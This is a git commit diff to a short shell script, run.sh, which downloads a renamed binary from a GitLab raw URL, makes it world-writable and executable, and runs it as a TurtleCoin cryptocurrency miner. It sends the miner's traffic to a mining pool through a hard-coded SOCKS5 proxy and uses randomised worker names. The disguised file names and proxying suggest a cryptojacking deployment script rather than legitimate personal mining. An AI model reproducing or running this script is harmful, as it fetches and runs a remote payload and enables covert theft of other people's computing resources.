75a4b35a26f47ef05cef2930654074fb86d922f3
darestiwaedi <87831139+darestiwaedi@users.noreply.github.com>
2021-08-14 00:18:22 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,11 +1,11 @@
 #!/bin/sh
 apt-get update 
 apt-get install screen libjansson4 -y
-wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
-chmod 777 masterfile
+wget https://gitlab.com/buyutuk/xmr/-/raw/main/xolx
+chmod 777 xolx
 screen -dmS ls
-POOL=149.248.5.123:6166
+POOL=pool.hashvault.pro:80
 WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
 WORKER=$(echo $(shuf -i 111111-999999 -n 1)-GAS)
 PROXY=socks5://72.210.252.134:46164
-./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 --max-cpu-usage 75 -x $PROXY -k
+./xolx -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 -t 2 -x $PROXY -k
